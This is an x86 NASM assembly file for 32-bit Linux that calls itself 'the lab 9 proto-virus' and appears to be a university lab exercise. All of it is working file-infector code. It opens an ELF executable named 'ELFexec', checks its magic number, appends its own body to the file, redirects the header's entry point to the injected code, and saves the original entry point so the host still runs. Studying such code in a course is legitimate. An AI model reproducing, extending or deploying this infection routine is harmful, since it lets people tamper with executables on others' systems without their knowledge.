%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%define fd 		ebp - 4

global _start

section .text
align 16
_start:	
	push	ebp
	mov		ebp, esp
	sub		esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	
	call 	getpos

getpos:
	mov 	dword ecx, [esp]			; this operation is in TOS
	
	add 	ecx, OutStrOffset

	write 	1, ecx, OutStrSz
	
	
	mov 	dword ebx, [esp]
	add 	ebx, FileNameOffset
	open 	ebx, RDWR, 0777

	cmp 	eax, 0
	jle  	error
	
	mov 	dword [fd], eax

	mov 	ecx, ebp
	sub 	ecx, 8
	read 	[fd], ecx, 4
	cmp 	eax, 0
	jle 	error
	cmp 	dword [ebp - 8], 0x464C457F
	jne 	error
	
	lseek 	[fd], 0, SEEK_END
	mov 	[esp - 4], eax

	mov 	ecx, [esp]
	add 	ecx, startOffset
	write 	[fd], ecx, virus_end - _start

	lseek 	[fd], 0, SEEK_SET		
	mov 	ecx, ebp
	sub 	ecx, STK_RES
	read 	[fd], ecx, 52

	mov 	ecx, ebp
	sub 	ecx, STK_RES - ENTRY
	mov 	eax, [ecx]
	mov 	[esp - 8], eax

	mov 	eax, [esp - 4]
	add 	eax, 0x08048000
	mov 	[ecx], eax

	lseek 	[fd], 0, SEEK_SET

	mov 	ecx, ebp
	sub 	ecx, STK_RES
	write 	[fd], ecx, 52

	lseek 	[fd], 0, SEEK_END
	sub 	eax, 4
	lseek 	[fd], eax, SEEK_SET
	mov 	ecx, esp
	sub 	ecx, 8
	write 	[fd], ecx, 4

VirusPreExit:
	mov 	eax, [esp]
	add 	eax, PEPOffset
	jmp 	[eax]
VirusExit:
   	exit 0          	; Termination if all is OK and no previous code to jump to
         	            ; (also an example for use of above macros)

error:
	mov 	ecx, [esp]
	add 	ecx, FailstrOffset
	write 	1, ecx, FailstrSz
	jmp 	VirusPreExit

FileNameOffset: equ $ - getpos
FileName:		db "ELFexec", 0
OutStrOffset: 	equ $ - getpos
OutStr:			db "The lab 9 proto-virus strikes!", 10, 0
OutStrSz: 		equ $ - OutStr
FailstrOffset:	equ $ - getpos
Failstr:        db "perhaps not", 10 , 0
FailstrSz: 		equ $ - Failstr
startOffset: 	equ _start - getpos
PEPOffset: 		equ $ - getpos
PreviousEntryPoint: dd VirusExit
virus_end:

